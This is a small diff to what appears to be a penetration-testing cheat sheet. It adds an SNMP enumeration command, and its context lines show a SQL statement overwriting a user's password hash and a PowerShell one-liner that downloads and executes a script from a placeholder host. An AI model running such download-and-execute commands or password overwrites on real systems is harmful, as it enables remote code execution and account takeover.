@@ -130,3 +130,8 @@ update planning_user set password ='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' wh
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
 ```
+---
+# SNMP
+```bash
+snmp-check <ip>
+```
